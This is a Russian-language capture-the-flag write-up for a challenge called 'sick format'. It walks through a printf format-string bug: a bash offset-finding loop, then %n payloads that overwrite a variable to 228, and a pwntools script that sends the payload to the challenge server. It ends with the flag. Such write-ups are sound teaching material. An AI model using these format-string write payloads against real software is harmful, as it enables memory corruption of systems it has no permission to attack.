# sick format writeup

Нам дан код на C и скомпилированный ELF-файл. Изучив код можно понять, что уязвимость заложена в функцию printf(), она связана с форматированием строки. Простыми словами, будем передавать ей аргументы, которых нет - таким образом программа будет вычитывать стэк.

###  Ищем пэйлоад

Будем передавать строку нашей программе таким образом `python -c "print 'AAAA' + '%x.'*OFFSET + '%x'" | ./sick_format` постоянно меняя OFFSET. Чтобы не делать это руками - напишем простой скрипт на bash:

```bash
offset_finder.sh

#!/bin/bash

for ((test=0; test<=30; test++)); do
    output=$(python -c "print 'AAAA' + '%x.'*$test + '%x'" | ./sick_format | grep "41414141")
    if [ -n "$output" ]; then
        echo "Найдена строка '41414141' для теста $test"
	echo "$output"
    fi
done
```

Теперь узнаем адрес нашей переменной `changeme`, которую нужно поменять для получения флага, а именно сделать ее равной 228.

В консоли отправляем следующий пэйлоад, в котором уже указан адрес нужной переменной:

`python -c "print '\x08\x04\xa0\x4c'[::-1] + '%x.'*6 + '%n'" | ./sick_format`

Рядом со строкой `No way...` появилось число, этло значение changeme. 

Теперь считаем, сколько нужно добавить до 228 и модифицируем пэйлоад:

`python -c "print '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%28d' + '%n'" | ./sick_format`

Отлично, все работает, теперь сделаем то же самое на сервере, где запущен настоящий файл.

Пишем скрипт:

```python
from pwn import *

conn = remote('IP', PORT)

payload = '\x08\x04\xa0\x4c'[::-1] + '%x.'*5 + '%28d' + '%n'

conn.sendline(payload)
print(conn.recv()) 
print(conn.recv())
```

Запускаем и получаем флаг **kxctf{f0rm4t1ng_str1ng_1s_aw3s0me_bruh_1m_pr0ud_0f_u_ma_b0y_<3}**


